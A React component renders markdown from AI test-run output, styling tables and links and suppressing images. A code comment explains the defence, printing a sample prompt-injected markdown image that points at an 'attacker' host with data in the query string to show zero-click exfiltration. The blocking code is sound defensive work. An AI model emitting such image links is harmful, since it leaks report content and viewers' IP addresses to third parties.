"use client";

import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

const cell = { whiteSpace: "normal", verticalAlign: "top", minWidth: 100 } as const;

const components: Components = {
  table: ({ node: _node, ...props }) => (
    <div className="tw not-prose" style={{ margin: "14px 0" }}>
      <table {...props} />
    </div>
  ),
  th: ({ node: _node, style, ...props }) => <th style={{ ...cell, ...style }} {...props} />,
  td: ({ node: _node, style, ...props }) => <td style={{ ...cell, ...style }} {...props} />,
  a: ({ node: _node, href, ...props }) => (
    <a href={href} {...props} {...(href && /^https?:/.test(href) ? { target: "_blank", rel: "noopener noreferrer" } : {})} />
  ),
  // Never load images from model output: the browser fetches an image as soon
  // as the report is viewed, so a prompt-injected ![](https://attacker/?d=…)
  // would leak report content (and the viewer's IP) with zero clicks. Show the alt text.
  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
};

/** Markdown for the test-run output. Loaded on demand (next/dynamic) so react-markdown stays out of the page bundle. */
export default function TestMd({ children }: { children: string }) {
  return (
    <div className="prose prose-sm max-w-none">
      <Markdown remarkPlugins={[remarkGfm]} components={components}>
        {children}
      </Markdown>
    </div>
  );
}
